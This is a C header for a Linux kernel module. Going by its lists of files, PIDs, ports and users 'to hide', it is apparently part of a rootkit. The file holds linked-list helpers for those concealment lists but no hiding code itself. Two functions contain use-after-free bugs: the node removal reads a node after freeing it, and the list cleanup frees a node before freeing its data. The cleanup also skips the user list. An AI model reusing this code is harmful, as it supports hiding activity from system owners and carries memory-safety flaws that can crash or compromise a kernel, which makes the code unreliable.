#ifndef LINKED_LIST_KITE
    #define LINKED_LIST_KITE

    #include <linux/kernel.h>


typedef struct linked_list {
    char *data;
    struct linked_list *next;
} list;

list *files_to_hide = NULL;
list *pids_to_hide = NULL;
list *ports_to_hide = NULL;
list *users_to_hide = NULL;



static int insert_node(list** root, char *data) {
    list* curr = *root;
    list* new_node = kmalloc(sizeof(list), GFP_KERNEL);
    char *temp = kmalloc(sizeof(char)*strlen(data) + 1, GFP_KERNEL);
    if (new_node == NULL || temp == NULL) {
        printk(KERN_INFO "error %s\n", data);
        return 1;
    }
    new_node->next = NULL;
    strcpy(temp, data);
    new_node->data = temp;
    
    if (*root == NULL) {
        *root = new_node;
        return 0;
    }
    while (curr->next != NULL) {
        curr = curr->next;
    }
    curr->next = new_node;
    return 0;
}


static int remove_node_by_name(list **root, char *data){
    list* curr = *root;
    if (*root == NULL) {
        return 1;
    }
    if(strcmp(curr->data, data) == 0){
        *root = curr->next;
        kfree(curr->data);
        kfree(curr);
        return 0;
    }
    while (curr->next != NULL) {
        if(strcmp(curr->next->data, data) == 0){
            kfree(curr->next->data);
            kfree(curr->next);
            curr->next = curr->next->next;
            return 0;
        }
        curr = curr->next;
        
    }
    return 1;
}


static int find_node(list** root, char *data) {
    list* curr = *root;
    if (*root == NULL){
        return 1;
    }
    
    if(strcmp(curr->data, data) == 0){
        return 0;
    }
    while (curr->next != NULL) {
        if(strcmp(curr->next->data, data) == 0){
            return 0;
        }
        curr = curr->next;
    }
    return 1;
}


static int cleanup_list(list** root){
    list* curr = *root;
    if (*root == NULL) {
        return 0;
    }
    while (curr != NULL) {
        list* aux = curr;
        curr = curr->next;
        kfree(aux);
        kfree(aux->data);
    }
    *root = NULL;
    return 0;
}


static int cleanup_lists(void){
    cleanup_list(&files_to_hide);
    cleanup_list(&pids_to_hide);
    cleanup_list(&ports_to_hide);
    return 0;
}

#endif